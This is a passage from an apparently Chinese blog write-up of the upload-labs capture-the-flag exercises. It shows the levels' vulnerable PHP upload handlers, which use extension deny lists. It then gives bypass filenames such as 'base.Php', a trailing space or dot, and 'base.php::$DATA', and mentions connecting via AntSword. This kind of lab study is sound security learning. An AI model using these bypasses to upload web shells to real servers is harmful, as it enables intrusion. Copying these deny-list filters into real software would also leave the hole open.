&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>抓包上传base.Php即可。</p>
<h2 id="Pass7【空格绕过（Windows）】"><a href="#Pass7【空格绕过（Windows）】" class="headerlink" title="Pass7【空格绕过（Windows）】"></a>Pass7【空格绕过（Windows）】</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这一关相比前两关没有用trim函数消掉后缀留白，因此可以抓包上传</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;base.php &quot;</span><br><span class="line">&quot;base. php&quot;</span><br></pre></td></tr></table></figure>

<p>windows下是会移动消去留白的。</p>
<h3 id="小发现2"><a href="#小发现2" class="headerlink" title="小发现2"></a>小发现2</h3><p>可是不知道是不是我文件上传是linux平台的，上传上去空格仍然在，因此无法连接蚁剑。</p>
<h2 id="Pass8【点绕过】"><a href="#Pass8【点绕过】" class="headerlink" title="Pass8【点绕过】"></a>Pass8【点绕过】</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这关没有删除后缀名末尾的点，直接抓包上传</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base.php.</span><br></pre></td></tr></table></figure>





<h2 id="Pass9【-DATA（Windows）】"><a href="#Pass9【-DATA（Windows）】" class="headerlink" title="Pass9【::$DATA（Windows）】"></a>Pass9【::$DATA（Windows）】</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>没有过滤这一句：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span><br></pre></td></tr></table></figure>

<blockquote>
<p>NTFS文件系统包括对备用数据流的支持。这不是众所周知的功能，主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：$ DATA。</p>
<p>简单讲就是在php+windows的情况下：如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名。</p>
</blockquote>
<p>因此抓包上传</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base.php::$DATA</span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/8-1.png" alt="8-1"></p>
<h2 id="Pass10【-绕过】"><a href="#Pass10【-绕过】" class="headerlink" title="Pass10【. .绕过】"></a>Pass10【. .绕过】</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span 